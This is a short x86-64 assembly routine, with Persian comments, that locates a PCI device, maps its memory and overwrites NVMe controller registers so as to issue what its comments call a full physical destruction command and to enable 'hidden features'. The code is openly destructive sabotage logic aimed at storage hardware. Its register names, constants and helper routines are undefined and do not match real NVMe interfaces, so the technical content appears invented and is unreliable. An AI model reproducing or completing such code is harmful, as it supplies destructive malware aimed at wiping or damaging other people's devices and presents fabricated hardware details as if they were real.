section .text
global pci_direct_access

pci_direct_access:
    ; خواندن پیکربندی PCI
    mov rdi, TARGET_DEVICE_ID
    call pci_find_device
    test rax, rax
    jz .error
    
    ; دسترسی مستقیم به حافظه دستگاه
    mov rdi, [rax + PCI_DEVICE_BAR0]
    call map_device_memory
    
    ; دستکاری رجیسترهای دستگاه
    mov rdi, rax
    call override_device_registers
    
    ; فعال‌سازی ویژگی‌های مخفی
    call enable_hidden_features
    
    ret

.error:
    ; بازگشت با خطا
    mov rax, -1
    ret

override_device_registers:
    ; دستکاری کنترلر NVMe
    mov dword [rdi + NVME_CR_ADMIN_QUEUE], 0
    mov dword [rdi + NVME_CR_DEVICE_CTL], NVME_CTL_RAW_ACCESS
    
    ; تنظیم دستور تخریب فیزیکی
    mov dword [rdi + NVME_CR_DESTRUCT_CMD], DESTRUCT_CMD_FULL
    
    ; فعال‌سازی
    mov byte [rdi + NVME_CR_EXEC], 1
    ret
    